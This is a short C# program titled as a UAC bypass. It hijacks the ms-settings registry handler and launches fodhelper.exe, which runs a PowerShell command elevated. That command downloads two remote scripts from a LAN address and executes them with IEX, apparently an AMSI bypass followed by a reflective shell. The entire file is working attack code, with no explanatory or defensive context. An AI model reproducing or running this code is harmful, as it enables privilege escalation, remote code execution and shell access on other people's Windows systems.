using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.ComponentModel;

namespace UAC_Bypass_1
{
    class uacbypass1
    {
        static void Main(string[] args)
        {
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Classes\\ms-settings\\Shell\\Open\\command");
            key.SetValue("DelegateExecute", "");
            key.SetValue("", @"powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.1.166/abypass.txt') | IEX; (New-Object System.Net.WebClient).DownloadString('http://192.168.1.166/reflectiveshell64.txt') | IEX");
            key.Close();
            try
            {
                using (Process myProcess = new Process())
                {
                    //myProcess.StartInfo.UseShellExecute = false;
                    myProcess.StartInfo.FileName = "C:\\Windows\\System32\\fodhelper.exe";
                    //myProcess.StartInfo.FileName = "C:\\Windows\\System32\\calc.exe";
                    ///myProcess.StartInfo.CreateNoWindow = true;
                    myProcess.Start();
                    myProcess.WaitForExit();
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

        }
    }
}
